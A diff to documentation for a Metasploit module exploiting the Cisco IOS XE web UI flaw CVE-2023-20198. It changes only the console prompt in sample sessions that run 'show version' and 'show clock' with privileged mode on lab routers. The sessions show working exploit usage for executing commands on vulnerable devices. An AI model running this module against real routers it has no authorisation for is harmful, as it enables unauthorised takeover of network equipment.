@@ -97,14 +97,14 @@ modes are `user`, `privileged`, and `global`.
 
 ### IOS XE 16.12.03 (CSR1000v)
 ```
-msf6 > use auxiliary/admin/http/cisco_ios_xe_cli_exec_cve_2023_20198
-msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > set RHOST 192.168.86.57
+msf > use auxiliary/admin/http/cisco_ios_xe_cli_exec_cve_2023_20198
+msf auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > set RHOST 192.168.86.57
 RHOST => 192.168.86.57
-msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > set CMD "show version"
+msf auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > set CMD "show version"
 CMD => show version
-msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > set MODE privileged
+msf auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > set MODE privileged
 MODE => privileged
-msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > show options
+msf auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > show options
 
 Module options (auxiliary/admin/http/cisco_ios_xe_cli_exec_cve_2023_20198):
 
@@ -121,7 +121,7 @@ Module options (auxiliary/admin/http/cisco_ios_xe_cli_exec_cve_2023_20198):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > run
+msf auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > run
 [*] Running module against 192.168.86.57
 
 
@@ -171,19 +171,19 @@ Processor board ID 9OVFUOGPESO
 Configuration register is 0x2102
 
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > run CMD="show clock"
+msf auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > run CMD="show clock"
 [*] Running module against 192.168.86.57
 
 
 *15:24:05.110 UTC Fri Nov 3 2023
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > 
+msf auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > 
 ```
 
 ### IOS XE 17.06.05 (C8000v)
 
 ```
-msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > show options 
+msf auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > show options 
 
 Module options (auxiliary/admin/http/cisco_ios_xe_cli_exec_cve_2023_20198):
 
@@ -200,7 +200,7 @@ Module options (auxiliary/admin/http/cisco_ios_xe_cli_exec_cve_2023_20198):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > run
+msf auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > run
 [*] Running module against 192.168.86.108
 
 Cisco IOS XE Software, Version 17.06.05
@@ -253,10 +253,10 @@ Router operating mode: Autonomous
 Configuration register is 0x2102
 
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > run CMD="show clock"
+msf auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > run CMD="show clock"
 [*] Running module against 192.168.86.108
 
 *17:36:50.722 UTC Mon Mar 3 2025
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > 
+msf auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > 
 ```
